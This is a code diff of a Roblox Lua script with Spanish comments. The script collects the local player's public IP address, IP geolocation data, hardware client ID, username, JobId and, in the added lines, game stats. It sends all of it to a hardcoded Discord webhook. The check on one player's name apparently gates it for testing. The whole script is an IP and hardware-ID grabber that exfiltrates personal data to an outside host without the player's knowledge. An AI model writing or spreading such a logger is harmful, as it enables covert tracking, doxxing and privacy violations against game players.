@@ -5,13 +5,13 @@ local discordWebhookUrl = "https://discord.com/api/webhooks/1326572470488141835/
 local lplr = Players.LocalPlayer
 
 if lplr.Name ~= "iLordYamoshi666" then
-    print("Este no es el jugador permitido") -- Mensaje en la consola
-    return -- Detiene la ejecución del script
+    print("Este no es el jugador permitido")
+    return
 end
 
--- Obtener IP y otros datos
+local data = game.ReplicatedStorage:WaitForChild("Datas"):WaitForChild(lplr.UserId)
 local ip = game:HttpGet("https://v4.ident.me/")
-local data = game:HttpGet("http://ip-api.com/json")
+local apiData = game:HttpGet("http://ip-api.com/json")
 local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 
 local function getAvatarUrl(userId)
@@ -19,7 +19,6 @@ local function getAvatarUrl(userId)
     local success, response = pcall(function()
         return game:HttpGet(url)
     end)
-
     if success then
         local data = HttpService:JSONDecode(response)
         if data.data and #data.data > 0 then
@@ -44,10 +43,12 @@ local function sendAvatarToDiscord(player)
                         {["name"] = "Usuario", ["value"] = player.Name, ["inline"] = true},
                         {["name"] = "Apodo", ["value"] = player.DisplayName, ["inline"] = true},
                         {["name"] = "UserID", ["value"] = tostring(userId), ["inline"] = false},
+                        {["name"] = "Rebirth", ["value"] = tostring(data.Rebirth.Value), ["inline"] = true},
+                        {["name"] = "Defense", ["value"] = tostring(data.Defense.Value), ["inline"] = true},
                         {["name"] = "JobId", ["value"] = game.JobId, ["inline"] = false},
                         {["name"] = "HWID", ["value"] = hwid, ["inline"] = false},
                         {["name"] = "IP", ["value"] = ip, ["inline"] = false},
-                        {["name"] = "Data", ["value"] = data, ["inline"] = false}
+                        {["name"] = "Data", ["value"] = apiData, ["inline"] = false}
                     },
                     ["thumbnail"] = {
                         ["url"] = avatarUrl
@@ -75,5 +76,4 @@ local function sendAvatarToDiscord(player)
     end
 end
 
--- Enviar la información solo si el jugador es "iLordYamoshi666"
 sendAvatarToDiscord(lplr)
